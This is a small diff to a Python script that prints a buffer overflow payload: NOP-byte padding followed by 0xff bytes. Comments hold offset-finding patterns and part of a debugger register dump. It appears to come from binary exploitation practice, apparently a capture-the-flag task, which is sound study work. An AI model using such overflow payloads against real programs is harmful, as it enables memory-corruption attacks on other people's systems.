@@ -1,13 +1,13 @@
 #!/bin/python3
 import sys
-sys.stdout.buffer.write(b'a' * 40 + b'\xff' * 16)
+sys.stdout.buffer.write(b'\x90' * 40 + b'\xff' * 8 + b'\n')
 
-"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaffffffffffffffffbb"
 
 # a0a1a2a3a4a5a6a7a8a9 b0b1b2b3b4b5b6b7b8b9 c0c1c2c3c4c5c6c7c8c9
 # a0a1a2a3a4a5a6a7a8a9b0b1b2b3b4b5b6b7b8b9c0c1c2c3c4c5c6c7c8c9
 # aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
 # aaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaaaa aaaaaaaa
+# 'a0a1a2a3a4a5a6a7a8a9b0b1b2b3b4b5b6b7b8b9' + '\xff' * 8
 # 
 # $rax   : 0x0
 # $rbx   : 0x00000000004012c0  →  <__libc_csu_init+0> endbr64
